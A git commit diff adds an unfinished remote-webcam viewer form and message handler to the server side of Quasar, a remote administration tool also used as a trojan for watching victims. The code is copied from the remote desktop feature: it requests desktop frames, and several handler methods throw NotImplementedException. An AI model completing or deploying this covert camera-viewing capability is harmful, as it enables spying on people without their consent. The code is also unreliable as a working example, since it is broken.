62ac377fb06f05b8f4c8b76f54f772266c2b8436
36200758 <36200758@qq.com>
2023-01-07 10:42:43 +0800

    添加项目文件。

---
+++ Quasar.Server/Forms/FrmRemoteWebcam.cs
@@ -0,0 +1,171 @@
+﻿using Quasar.Common.Messages;
+using Quasar.Server.Helper;
+using Quasar.Server.Messages;
+using Quasar.Server.Networking;
+using Quasar.Server.Utilities;
+using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+
+namespace Quasar.Server.Forms
+{
+    public partial class FrmRemoteWebcam : Form
+    {
+        /// <summary>
+        /// The client which can be used for the task manager.
+        /// </summary>
+        private readonly Client _connectClient;
+
+        /// <summary>
+        /// The message handler for handling the communication with the client.
+        /// </summary>
+        private readonly RemoteWebcamHandler _remoteWebcamHandler;
+
+        public FrmRemoteWebcam(Client client)
+        {
+            _connectClient = client;
+            _remoteWebcamHandler = new RemoteWebcamHandler(client);
+            RegisterMessageHandler();
+            InitializeComponent();
+        }
+
+        private void RegisterMessageHandler()
+        {
+            _connectClient.ClientState += ClientDisconnected;
+            _remoteWebcamHandler.DisplaysChanged += DisplaysChanged;
+            _remoteWebcamHandler.ProgressChanged += UpdateImage;
+            MessageHandler.Register(_remoteWebcamHandler);
+        }
+
+        /// <summary>
+        /// Unregisters the remote desktop message handler.
+        /// </summary>
+        private void UnregisterMessageHandler()
+        {
+            MessageHandler.Unregister(_remoteWebcamHandler);
+            _remoteWebcamHandler.DisplaysChanged -= DisplaysChanged;
+            _remoteWebcamHandler.ProgressChanged -= UpdateImage;
+            _connectClient.ClientState -= ClientDisconnected;
+        }
+
+        private void DisplaysChanged(object sender, int displays)
+        {
+            cbWebcams.Items.Clear();
+            for (int i = 0; i < displays; i++)
+                cbWebcams.Items.Add($"Display {i + 1}");
+            cbWebcams.SelectedIndex = 0;
+        }
+
+        private void UpdateImage(object sender, Bitmap bmp)
+        {
+            picWebcam.UpdateImage(bmp, false);
+        }
+
+        private void ClientDisconnected(Client client, bool connected)
+        {
+            if (!connected)
+            {
+                this.Invoke((MethodInvoker)this.Close);
+            }
+        }
+
+        private void FrmRemoteWebcam_Load(object sender, EventArgs e)
+        {
+
+        }
+        // <summary>
+        /// Holds the opened Webcam form for each client.
+        /// </summary>
+        private static readonly Dictionary<Client, FrmRemoteWebcam> OpenedForms = new Dictionary<Client, FrmRemoteWebcam>();
+        public static FrmRemoteWebcam CreateNewOrGetExisting(Client client)
+        {
+            if (OpenedForms.ContainsKey(client))
+            {
+                return OpenedForms[client];
+            }
+            FrmRemoteWebcam f = new FrmRemoteWebcam(client);
+            f.Disposed += (sender, args) => OpenedForms.Remove(client);
+            OpenedForms.Add(client, f);
+            return f;
+        }
+
+        private void FrmRemoteWebcam_FormClosing(object sender, FormClosingEventArgs e)
+        {
+            // all cleanup logic goes here
+            if (_remoteWebcamHandler.IsStarted) StopStream();
+            UnregisterMessageHandler();
+            _remoteWebcamHandler.Dispose();
+            picWebcam.Image?.Dispose();
+        }
+
+        /// <summary>
+        /// Stops the remote desktop stream.
+        /// </summary>
+        private void StopStream()
+        {
+            ToggleConfigurationControls(false);
+
+            picWebcam.Stop();
+            // Unsubscribe from the frame counter. It will be re-created when starting again.
+            picWebcam.UnsetFrameUpdatedEvent(frameCounter_FrameUpdated);
+
+            this.ActiveControl = picWebcam;
+
+            _remoteWebcamHandler.EndReceiveFrames();
+        }
+
+        /// <summary>
+        /// Updates the title with the current frames per second.
+        /// </summary>
+        /// <param name="e">The new frames per second.</param>
+        private void frameCounter_FrameUpdated(FrameUpdatedEventArgs e)
+        {
+            this.Text = string.Format("{0} - FPS: {1}", WindowHelper.GetWindowTitle("Remote Desktop", _connectClient), e.CurrentFramesPerSecond.ToString("0.00"));
+        }
+
+        /// <summary>
+        /// Toggles the activatability of configuration controls in the status/configuration panel.
+        /// </summary>
+        /// <param name="started">When set to <code>true</code> the configuration controls get enabled, otherwise they get disabled.</param>
+        private void ToggleConfigurationControls(bool started)
+        {
+            btnStart.Enabled = !started;
+            btnStop.Enabled = started;
+            //barQuality.Enabled = !started;
+            cbWebcams.Enabled = !started;
+        }
+
+        private void btnStart_Click(object sender, EventArgs e)
+        {
+            if (cbWebcams.Items.Count == 0)
+            {
+                MessageBox.Show("No remote webcam detected.\nPlease wait till the client sends a list with available displays.",
+                    "Starting failed", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+                return;
+            }
+            StartStream();
+        }
+
+        /// <summary>
+        /// Starts the remote desktop stream and begin to receive desktop frames.
+        /// </summary>
+        private void StartStream()
+        {
+            ToggleConfigurationControls(true);
+
+            picWebcam.Start();
+            // Subscribe to the new frame counter.
+            picWebcam.SetFrameUpdatedEvent(frameCounter_FrameUpdated);
+
+            this.ActiveControl = picWebcam;
+
+            _remoteWebcamHandler.BeginReceiveFrames(0, cbWebcams.SelectedIndex);
+        }
+    }
+}
---
+++ Quasar.Server/Messages/RemoteWebcamHandler.cs
@@ -0,0 +1,121 @@
+﻿using Mono.Cecil.Cil;
+using Quasar.Common.Messages;
+using Quasar.Common.Networking;
+using Quasar.Common.Video.Codecs;
+using Quasar.Server.Networking;
+using System;
+using System.Collections.Generic;
+using System.Drawing;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace Quasar.Server.Messages
+{
+    internal class RemoteWebcamHandler : MessageProcessorBase<Bitmap>, IDisposable
+    {
+        public RemoteWebcamHandler(Client client) : base(true)
+        {
+            _client = client;
+        }
+
+        /// <summary>
+        /// Begins receiving frames from the client using the specified quality and display.
+        /// </summary>
+        /// <param name="quality">The quality of the remote desktop frames.</param>
+        /// <param name="display">The display to receive frames from.</param>
+        public void BeginReceiveFrames(int quality, int display)
+        {
+            lock (_syncLock)
+            {
+                IsStarted = true;
+                _codec?.Dispose();
+                _codec = null;
+                _client.Send(new GetDesktop { CreateNew = true, Quality = quality, DisplayIndex = display });
+            }
+        }
+
+        /// <summary>
+        /// States if the client is currently streaming desktop frames.
+        /// </summary>
+        public bool IsStarted { get; set; }
+
+        /// <summary>
+        /// The client which is associated with this startup manager handler.
+        /// </summary>
+        public readonly Client _client;
+        /// <summary>
+        /// Used in lock statements to synchronize access to <see cref="_codec"/> between UI thread and thread pool.
+        /// </summary>
+        private readonly object _syncLock = new object();
+
+        /// <summary>
+        /// Used in lock statements to synchronize access to <see cref="LocalResolution"/> between UI thread and thread pool.
+        /// </summary>
+        private readonly object _sizeLock = new object();
+
+        /// <summary>
+        /// The video stream codec used to decode received frames.
+        /// </summary>
+        private UnsafeStreamCodec _codec;
+
+        /// <summary>
+        /// Represents the method that will handle display changes.
+        /// </summary>
+        /// <param name="sender">The message processor which raised the event.</param>
+        /// <param name="value">All currently available displays.</param>
+        public delegate void DisplaysChangedEventHandler(object sender, int value);
+
+        /// <summary>
+        /// Raised when a display changed.
+        /// </summary>
+        /// <remarks>
+        /// Handlers registered with this event will be invoked on the 
+        /// <see cref="System.Threading.SynchronizationContext"/> chosen when the instance was constructed.
+        /// </remarks>
+        public event DisplaysChangedEventHandler DisplaysChanged;
+
+        /// <summary>
+        /// Ends receiving frames from the client.
+        /// </summary>
+        public void EndReceiveFrames()
+        {
+            lock (_syncLock)
+            {
+                IsStarted = false;
+            }
+        }
+
+        public override bool CanExecute(IMessage message)
+        {
+            throw new NotImplementedException();
+        }
+
+        public override bool CanExecuteFrom(ISender sender)
+        {
+            throw new NotImplementedException();
+        }
+
+        public void Dispose()
+        {
+            Dispose(true);
+            GC.SuppressFinalize(this);
+        }
+        protected virtual void Dispose(bool disposing)
+        {
+            if (disposing)
+            {
+                lock (_syncLock)
+                {
+                    _codec?.Dispose();
+                    IsStarted = false;
+                }
+            }
+        }
+
+        public override void Execute(ISender sender, IMessage message)
+        {
+            throw new NotImplementedException();
+        }
+    }
+}
